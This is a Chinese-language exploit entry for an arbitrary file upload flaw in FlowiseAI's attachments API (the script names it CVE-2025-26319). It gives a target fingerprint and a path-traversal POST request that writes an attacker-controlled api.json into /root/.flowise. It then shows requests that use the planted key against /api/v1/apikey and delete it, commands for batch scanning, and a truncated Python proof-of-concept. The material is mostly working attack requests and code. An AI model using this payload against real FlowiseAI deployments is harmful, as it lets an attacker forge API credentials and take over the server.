# FlowiseAI系统attachments任意文件上传漏洞-副本

- **系统**：FlowiseAI　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="FlowiseAI"`
- **请求**：`POST /api/v1/attachments/..%2f..%2f..%2f..%2f..%2froot%2f/.flowise HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydTh0yj8z…`

**请求体 / payload**
```
------WebKitFormBoundarydTh0yj8zypRgPT1w
Content-Disposition: form-data; name="files"; filename="api.json"
Content-type: text/plain
[{
"keyName":"=",
"apiKey":"24NHxsKIZi7Ee34rl7FtW3dtW1IuYjFQDegXP_Bn8yQ",
"apiSecret":"8648f55db62716a6577b565efb66145b9ad8c50884c57ae8d4f03c4cd8b3ee27b1f77804d320f08bac8aa4b0dbf58a39dacbb767eb05efe1e57d5c66e5d48473.af4b3f229bd11ac5",
"createdAt":"111",
"id":"1111"
}]
------WebKitFormBoundarydTh0yj8zypRgPT1w--
查找api是否存在
GET /api/v1/apikey HTTP/1.1
Host:
Authorization: Bearer 24NHxsKIZi7Ee34rl7FtW3dtW1IuYjFQDegXP_Bn8yQ
删除写入文件，数据还原
DELETE /api/v1/apikey/1111 HTTP/1.1
Authorization: Bearer 24NHxsKIZi7Ee34rl7FtW3dtW1IuYjFQDegXP_Bn8yQ
Host:
批量检测：
python poc.py -f url.txt
单个检测：
python poc.py -u your-ip
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import argparse
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor
import sys
import os
class colors:
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
END = '\033[0m'
BOLD = '\033[1m'
def banner():
print(f"""{colors.BOLD}{colors.BLUE}
_____ _                 _____ _       _   _____ ___
___  ___  ___ ___    ___(_) __ _  _   _/ _ \\
_   / _ \\/ __/ __  _   / _`
_    __/\__ \__ \   _   (_       _
_   _\______/___/ _   _\__,__   _ \___/
{colors.BLUE}CVE-2025-26319 Detector{colors.BLUE}
{colors.YELLOW}Developed by iSee857{colors.END}
""")
def check_vulnerability(url):
try:
target = url.strip('/')
vuln_url = urljoin(target, "/api/v1/attachmen…（脚本共 4149 字，完整版见原文）
```
- **预期**：200　|　—